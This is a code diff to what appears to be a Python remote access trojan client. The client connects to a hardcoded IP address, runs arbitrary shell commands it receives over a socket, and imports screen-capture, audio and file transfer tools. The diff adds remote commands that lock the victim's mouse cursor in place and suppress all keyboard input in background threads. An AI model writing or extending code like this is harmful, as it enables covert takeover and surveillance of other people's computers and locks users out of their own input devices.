@@ -17,12 +17,15 @@ import pyautogui
 import shutil
 import pyaudio 
 from pynput.keyboard import Key, Controller
+from pynput import keyboard
 from mss import mss
 import numpy as np
 from filetarget import download_file, upload_file
 
 ip = '192.168.18.198'
 main_log1 = threading.Event()
+is_locked_cursor = False
+is_locked_keyboard = False
 
 def get_pid(sok):
     try:
@@ -33,7 +36,40 @@ def get_pid(sok):
     except:
         return
 
+def lock_cursor():
+    global is_locked_cursor
+
+    while True:
+        if is_locked_cursor:
+            x, y = pyautogui.position()
+
+            while is_locked_cursor:
+                pyautogui.moveTo(x, y)
+                time.sleep(0.001)
+        time.sleep(0.1)
+
+def lock_keyboard():
+    global is_locked_keyboard
+
+    while True:
+        if is_locked_keyboard:
+            block_keyboard = keyboard.Listener(suppress=True)
+
+            block_keyboard.start()
+
+def thread_lock_cursor():
+    lcu = threading.Thread(target=lock_cursor, daemon=True)
+    lcu.start()
+
+def thread_lock_keyboard():
+    lkb = threading.Thread(target=lock_keyboard, daemon=True)
+    lkb.start()
+
+thread_lock_cursor()
+thread_lock_keyboard()
+
 def move_cursor(sok):
+    global is_locked_cursor, is_locked_keyboard
     try:
         pyautogui.FAILSAFE = False
         sok.settimeout(3.0)
@@ -52,10 +88,27 @@ def move_cursor(sok):
         if data == "rclick":
             pyautogui.rightClick()
             return
+        
         elif data == "lclick":
             pyautogui.leftClick()
             return
+        
+        elif data == "unlock cursor":
+            is_locked_cursor = False
+            return
+            
+        elif data == "lock cursor":
+            is_locked_cursor = True
+            return
 
+        elif data == "unlock keyboard":
+            is_locked_keyboard = False
+            return
+
+        elif data == "lock keyboard":
+            is_locked_keyboard = True
+            return
+            
         if "," not in data:
             return
         
@@ -355,6 +408,8 @@ def jalankan_perintah(sok):
             move_cursor(sok)
         elif perintah == "getpid":
             get_pid(sok)
+        elif perintah.startswith("ui"):
+            move_cursor(sok)
         else:
             exe = subprocess.Popen(
             perintah,
